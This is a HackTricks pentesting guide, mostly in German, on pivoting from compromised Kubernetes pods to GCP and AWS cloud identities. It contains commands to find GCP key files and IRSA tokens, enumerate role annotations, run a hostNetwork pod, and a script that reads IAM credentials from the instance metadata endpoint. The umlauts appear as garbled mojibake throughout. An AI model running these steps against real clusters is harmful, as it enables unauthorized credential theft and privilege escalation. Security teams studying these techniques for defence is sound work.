# Kubernetes Pivoting to Clouds

{% hint style="success" %}
Lerne & √ºbe AWS Hacking:<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Lerne & √ºbe GCP Hacking: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* √úberpr√ºfe die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Tritt der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teile Hacking-Tricks, indem du PRs zu den** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.

</details>
{% endhint %}

## GCP

Wenn du einen k8s-Cluster innerhalb von GCP betreibst, m√∂chtest du wahrscheinlich, dass eine Anwendung, die im Cluster l√§uft, Zugriff auf GCP hat. Es gibt 2 g√§ngige M√∂glichkeiten, dies zu tun:

### GCP-SA-Schl√ºssel als Geheimnis einbinden

Eine g√§ngige Methode, um **Zugriff auf eine Kubernetes-Anwendung zu GCP** zu gew√§hren, ist:

* Erstelle ein GCP-Dienstkonto
* Binde die gew√ºnschten Berechtigungen daran
* Lade einen JSON-Schl√ºssel des erstellten Dienstkontos herunter
* Binde es als Geheimnis innerhalb des Pods ein
* Setze die Umgebungsvariable GOOGLE\_APPLICATION\_CREDENTIALS auf den Pfad, wo die JSON-Datei gespeichert ist.

{% hint style="warning" %}
Daher solltest du als **Angreifer**, wenn du einen Container innerhalb eines Pods kompromittierst, nach dieser **Umgebungsvariable** und **JSON**-**Dateien** mit GCP-Anmeldeinformationen suchen.
{% endhint %}

### GSA-JSON mit KSA-Geheimnis verkn√ºpfen

Eine M√∂glichkeit, einem GSA Zugriff auf einen GKE-Cluster zu gew√§hren, besteht darin, sie auf folgende Weise zu binden:

* Erstelle ein Kubernetes-Dienstkonto im selben Namespace wie dein GKE-Cluster mit dem folgenden Befehl:
```bash
Copy codekubectl create serviceaccount <service-account-name>
```
* Erstellen Sie ein Kubernetes Secret, das die Anmeldeinformationen des GCP-Dienstkontos enth√§lt, dem Sie Zugriff auf den GKE-Cluster gew√§hren m√∂chten. Sie k√∂nnen dies mit dem `gcloud`-Befehlszeilenwerkzeug tun, wie im folgenden Beispiel gezeigt:
```bash
Copy codegcloud iam service-accounts keys create <key-file-name>.json \
--iam-account <gcp-service-account-email>
kubectl create secret generic <secret-name> \
--from-file=key.json=<key-file-name>.json
```
* Binden Sie das Kubernetes Secret an das Kubernetes-Dienstkonto mit dem folgenden Befehl:
```bash
Copy codekubectl annotate serviceaccount <service-account-name> \
iam.gke.io/gcp-service-account=<gcp-service-account-email>
```
{% hint style="warning" %}
Im **zweiten Schritt** wurden die **Anmeldeinformationen des GSA als Geheimnis des KSA festgelegt**. Wenn Sie dann **dieses Geheimnis** von **innerhalb** des **GKE**-Clusters **lesen k√∂nnen**, k√∂nnen Sie **zu diesem GCP-Dienstkonto eskalieren**.
{% endhint %}

### GKE Workload Identity

Mit Workload Identity k√∂nnen wir ein[ Kubernetes-Dienstkonto](https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/) so konfigurieren, dass es als[ Google-Dienstkonto](https://cloud.google.com/iam/docs/understanding-service-accounts) fungiert. Pods, die mit dem Kubernetes-Dienstkonto ausgef√ºhrt werden, authentifizieren sich automatisch als das Google-Dienstkonto, wenn sie auf Google Cloud APIs zugreifen.

Die **erste Reihe von Schritten**, um dieses Verhalten zu aktivieren, besteht darin, **Workload Identity in GCP zu aktivieren** ([**Schritte**](https://medium.com/zeotap-customer-intelligence-unleashed/gke-workload-identity-a-secure-way-for-gke-applications-to-access-gcp-services-f880f4e74e8c)) und das GCP SA zu erstellen, das k8s nachahmen soll.

* **Aktivieren Sie Workload Identity** in einem neuen Cluster

{% code overflow="wrap" %}
```bash
gcloud container clusters update <cluster_name> \
--region=us-central1 \
--workload-pool=<project-id>.svc.id.goog
```
{% endcode %}

* **Erstellen/Aktualisieren eines neuen Nodepools** (Autopilot-Cluster ben√∂tigen dies nicht)

{% code overflow="wrap" %}
```bash
# You could update instead of create
gcloud container node-pools create <nodepoolname> --cluster=<cluser_name> --workload-metadata=GKE_METADATA --region=us-central1
```
{% endcode %}

* Erstellen Sie das **GCP-Dienstkonto zur Nachahmung** von K8s mit GCP-Berechtigungen:

{% code overflow="wrap" %}
```bash
# Create SA called "gsa2ksa"
gcloud iam service-accounts create gsa2ksa --project=<project-id>

# Give "roles/iam.securityReviewer" role to the SA
gcloud projects add-iam-policy-binding <project-id> \
--member "serviceAccount:gsa2ksa@<project-id>.iam.gserviceaccount.com" \
--role "roles/iam.securityReviewer"
```
{% endcode %}

* **Verbinden** Sie sich mit dem **Cluster** und **erstellen** Sie das **Dienstkonto**, das Sie verwenden m√∂chten

{% code overflow="wrap" %}
```bash
# Get k8s creds
gcloud container clusters get-credentials <cluster_name> --region=us-central1

# Generate our testing namespace
kubectl create namespace testing

# Create the KSA
kubectl create serviceaccount ksa2gcp -n testing
```
{% endcode %}

* **Binden Sie die GSA mit der KSA**

{% code overflow="wrap" %}
```bash
# Allow the KSA to access the GSA in GCP IAM
gcloud iam service-accounts add-iam-policy-binding gsa2ksa@<project-id.iam.gserviceaccount.com \
--role roles/iam.workloadIdentityUser \
--member "serviceAccount:<project-id>.svc.id.goog[<namespace>/ksa2gcp]"

# Indicate to K8s that the SA is able to impersonate the GSA
kubectl annotate serviceaccount ksa2gcp \
--namespace testing \
iam.gke.io/gcp-service-account=gsa2ksa@security-devbox.iam.gserviceaccount.com
```
{% endcode %}

* F√ºhren Sie ein **pod** mit der **KSA** aus und √ºberpr√ºfen Sie den **Zugriff** auf die **GSA:**
```bash
# If using Autopilot remove the nodeSelector stuff!
echo "apiVersion: v1
kind: Pod
metadata:
name: workload-identity-test
namespace: <namespace>
spec:
containers:
- image: google/cloud-sdk:slim
name: workload-identity-test
command: ['sleep','infinity']
serviceAccountName: ksa2gcp
nodeSelector:
iam.gke.io/gke-metadata-server-enabled: 'true'" | kubectl apply -f-

# Get inside the pod
kubectl exec -it workload-identity-test \
--namespace testing \
-- /bin/bash

# Check you can access the GSA from insie the pod with
curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email
gcloud auth list
```
√úberpr√ºfen Sie den folgenden Befehl zur Authentifizierung, falls erforderlich:

{% code overflow="wrap" %}
```bash
gcloud auth activate-service-account --key-file=/var/run/secrets/google/service-account/key.json
```
{% endcode %}

{% hint style="warning" %}
Als Angreifer innerhalb von K8s sollten Sie **nach SAs suchen**, die die **`iam.gke.io/gcp-service-account`-Annotation** haben, da dies darauf hinweist, dass der SA auf etwas in GCP zugreifen kann. Eine weitere M√∂glichkeit w√§re, zu versuchen, jede KSA im Cluster auszunutzen und zu √ºberpr√ºfen, ob sie Zugriff hat.\
Es ist immer interessant, die Bindungen von GCP aufzulisten und zu wissen, **welchen Zugriff Sie SAs innerhalb von Kubernetes gew√§hren**.
{% endhint %}

Dies ist ein Skript, um einfach **√ºber alle Pod-Definitionen zu iterieren** und nach dieser **Annotation** zu suchen:
```bash
for ns in `kubectl get namespaces -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
for pod in `kubectl get pods -n "$ns" -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
echo "Pod: $ns/$pod"
kubectl get pod "$pod" -n "$ns" -o yaml | grep "gcp-service-account"
echo ""
echo ""
done
done | grep -B 1 "gcp-service-account"
```
## AWS

### Kiam & Kube2IAM (IAM-Rolle f√ºr Pods) <a href="#workflow-of-iam-role-for-service-accounts" id="workflow-of-iam-role-for-service-accounts"></a>

Eine (veraltete) M√∂glichkeit, IAM-Rollen an Pods zu vergeben, besteht darin, einen [**Kiam**](https://github.com/uswitch/kiam) oder einen [**Kube2IAM**](https://github.com/jtblin/kube2iam) **Server** zu verwenden. Grunds√§tzlich m√ºssen Sie ein **Daemonset** in Ihrem Cluster mit einer **Art von privilegierter IAM-Rolle** ausf√ºhren. Dieses Daemonset wird den Pods, die es ben√∂tigen, Zugriff auf IAM-Rollen gew√§hren.

Zun√§chst m√ºssen Sie **konfigurieren, welche Rollen innerhalb des Namensraums zug√§nglich sind**, und das tun Sie mit einer Annotation im Namensraum-Objekt:

{% code title="Kiam" %}
```yaml
kind: Namespace
metadata:
name: iam-example
annotations:
iam.amazonaws.com/permitted: ".*"
```
{% endcode %}

{% code title="Kube2iam" %}
```yaml
apiVersion: v1
kind: Namespace
metadata:
annotations:
iam.amazonaws.com/allowed-roles: |
["role-arn"]
name: default
```
{% endcode %}

Sobald der Namespace mit den IAM-Rollen konfiguriert ist, die die Pods haben k√∂nnen, k√∂nnen Sie **die Rolle, die Sie in jeder Pod-Definition m√∂chten, mit etwas wie** angeben:

{% code title="Kiam & Kube2iam" %}
```yaml
kind: Pod
metadata:
name: foo
namespace: external-id-example
annotations:
iam.amazonaws.com/role: reportingdb-reader
```
{% endcode %}

{% hint style="warning" %}
Als Angreifer, wenn Sie **diese Annotationen** in Pods oder Namespaces finden oder einen kiam/kube2iam-Server (wahrscheinlich im kube-system) laufen haben, k√∂nnen Sie **jede r**olle, die bereits **von Pods** verwendet wird, und mehr **nachahmen** (wenn Sie Zugriff auf das AWS-Konto haben, listen Sie die Rollen auf).
{% endhint %}

#### Pod mit IAM-Rolle erstellen

{% hint style="info" %}
Die anzugebende IAM-Rolle muss im selben AWS-Konto wie die kiam/kube2iam-Rolle sein, und diese Rolle muss darauf zugreifen k√∂nnen.
{% endhint %}
```yaml
echo 'apiVersion: v1
kind: Pod
metadata:
annotations:
iam.amazonaws.com/role: transaction-metadata
name: alpine
namespace: eevee
spec:
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", "sleep 100000"]' | kubectl apply -f -
```
### IAM-Rolle f√ºr K8s-Dienstkonten √ºber OIDC <a href="#workflow-of-iam-role-for-service-accounts" id="workflow-of-iam-role-for-service-accounts"></a>

Dies ist der **empfohlene Weg von AWS**.

1. Zuerst m√ºssen Sie [einen OIDC-Anbieter f√ºr den Cluster erstellen](https://docs.aws.amazon.com/eks/latest/userguide/enable-iam-roles-for-service-accounts.html).
2. Dann erstellen Sie eine IAM-Rolle mit den Berechtigungen, die das SA ben√∂tigt.
3. Erstellen Sie eine [Vertrauensbeziehung zwischen der IAM-Rolle und dem SA](https://docs.aws.amazon.com/eks/latest/userguide/associate-service-account-role.html) Namen (oder den Namespaces, die den Zugriff auf die Rolle f√ºr alle SAs des Namespaces gew√§hren). _Die Vertrauensbeziehung √ºberpr√ºft haupts√§chlich den OIDC-Anbieternamen, den Namespace-Namen und den SA-Namen_.
4. Schlie√ülich **erstellen Sie ein SA mit einer Annotation, die die ARN der Rolle angibt**, und die Pods, die mit diesem SA ausgef√ºhrt werden, haben **Zugriff auf das Token der Rolle**. Das **Token** wird **in** eine Datei **geschrieben** und der Pfad ist in **`AWS_WEB_IDENTITY_TOKEN_FILE`** angegeben (Standard: `/var/run/secrets/eks.amazonaws.com/serviceaccount/token`)
```bash
# Create a service account with a role
cat >my-service-account.yaml <<EOF
apiVersion: v1
kind: ServiceAccount
metadata:
name: my-service-account
namespace: default
annotations:
eks.amazonaws.com/role-arn: arn:aws:iam::318142138553:role/EKSOIDCTesting
EOF
kubectl apply -f my-service-account.yaml

# Add a role to an existent service account
kubectl annotate serviceaccount -n $namespace $service_account eks.amazonaws.com/role-arn=arn:aws:iam::$account_id:role/my-role
```
Um **aws mit dem Token** von `/var/run/secrets/eks.amazonaws.com/serviceaccount/token` zu erhalten, f√ºhren Sie aus:

{% code overflow="wrap" %}
```bash
aws sts assume-role-with-web-identity --role-arn arn:aws:iam::123456789098:role/EKSOIDCTesting --role-session-name something --web-identity-token file:///var/run/secrets/eks.amazonaws.com/serviceaccount/token
```
{% endcode %}

{% hint style="warning" %}
Als Angreifer, wenn Sie einen K8s-Cluster enumerieren k√∂nnen, √ºberpr√ºfen Sie **Servicekonten mit dieser Annotation**, um sich **zu AWS zu eskalieren**. Dazu erstellen Sie einfach einen **Pod** mit einem der IAM **privilegierten Servicekonten** und stehlen das Token.

Dar√ºber hinaus, wenn Sie sich in einem Pod befinden, √ºberpr√ºfen Sie Umgebungsvariablen wie **AWS\_ROLE\_ARN** und **AWS\_WEB\_IDENTITY\_TOKEN.**
{% endhint %}

{% hint style="danger" %}
Manchmal k√∂nnte die **Trust Policy einer Rolle** **schlecht konfiguriert** sein und anstatt dem erwarteten Servicekonto Zugriff auf AssumeRole zu gew√§hren, gew√§hrt sie es **allen Servicekonten**. Daher, wenn Sie in der Lage sind, eine Annotation auf einem kontrollierten Servicekonto zu schreiben, k√∂nnen Sie auf die Rolle zugreifen.

√úberpr√ºfen Sie die **folgende Seite f√ºr weitere Informationen**:
{% endhint %}

{% content-ref url="../aws-security/aws-basic-information/aws-federation-abuse.md" %}
[aws-federation-abuse.md](../aws-security/aws-basic-information/aws-federation-abuse.md)
{% endcontent-ref %}

### Finden Sie Pods und SAs mit IAM-Rollen im Cluster

Dies ist ein Skript, um einfach **√ºber alle Pods und SAs** Definitionen **zu iterieren** und nach dieser **Annotation** zu suchen:
```bash
for ns in `kubectl get namespaces -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
for pod in `kubectl get pods -n "$ns" -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
echo "Pod: $ns/$pod"
kubectl get pod "$pod" -n "$ns" -o yaml | grep "amazonaws.com"
echo ""
echo ""
done
for sa in `kubectl get serviceaccounts -n "$ns" -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
echo "SA: $ns/$sa"
kubectl get serviceaccount "$sa" -n "$ns" -o yaml | grep "amazonaws.com"
echo ""
echo ""
done
done | grep -B 1 "amazonaws.com"
```
### Node IAM Role

Der vorherige Abschnitt handelte davon, wie man IAM-Rollen mit Pods stiehlt, aber beachten Sie, dass ein **Node des** K8s-Clusters eine **Instanz in der Cloud** sein wird. Das bedeutet, dass der Node h√∂chstwahrscheinlich **eine neue IAM-Rolle haben wird, die Sie stehlen k√∂nnen** (_beachten Sie, dass normalerweise alle Nodes eines K8s-Clusters die gleiche IAM-Rolle haben, daher k√∂nnte es sich nicht lohnen, jeden Node zu √ºberpr√ºfen_).

Es gibt jedoch eine wichtige Voraussetzung, um auf den Metadaten-Endpunkt vom Node zuzugreifen: Sie m√ºssen sich im Node befinden (SSH-Sitzung?) oder zumindest dasselbe Netzwerk haben:
```bash
kubectl run NodeIAMStealer --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostNetwork": true, "containers":[{"name":"1","image":"alpine","stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent"}]}}'
```
### Steal IAM Role Token

Previously we have discussed how to **attach IAM Roles to Pods** or even how to **escape to the Node to steal the IAM Role** the instance has attached to it.

You can use the following script to **steal** your new hard worked **IAM role credentials**:
```bash
IAM_ROLE_NAME=$(curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null || wget  http://169.254.169.254/latest/meta-data/iam/security-credentials/ -O - 2>/dev/null)
if [ "$IAM_ROLE_NAME" ]; then
echo "IAM Role discovered: $IAM_ROLE_NAME"
if ! echo "$IAM_ROLE_NAME" | grep -q "empty role"; then
echo "Credentials:"
curl "http://169.254.169.254/latest/meta-data/iam/security-credentials/$IAM_ROLE_NAME" 2>/dev/null || wget "http://169.254.169.254/latest/meta-data/iam/security-credentials/$IAM_ROLE_NAME" -O - 2>/dev/null
fi
fi
```
## Referenzen

* [https://cloud.google.com/kubernetes-engine/docs/how-to/workload-identity](https://cloud.google.com/kubernetes-engine/docs/how-to/workload-identity)
* [https://medium.com/zeotap-customer-intelligence-unleashed/gke-workload-identity-a-secure-way-for-gke-applications-to-access-gcp-services-f880f4e74e8c](https://medium.com/zeotap-customer-intelligence-unleashed/gke-workload-identity-a-secure-way-for-gke-applications-to-access-gcp-services-f880f4e74e8c)
* [https://blogs.halodoc.io/iam-roles-for-service-accounts-2/](https://blogs.halodoc.io/iam-roles-for-service-accounts-2/)

{% hint style="success" %}
Lernen & √ºben Sie AWS Hacking:<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Lernen & √ºben Sie GCP Hacking: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtzen Sie HackTricks</summary>

* √úberpr√ºfen Sie die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.

</details>
{% endhint %}
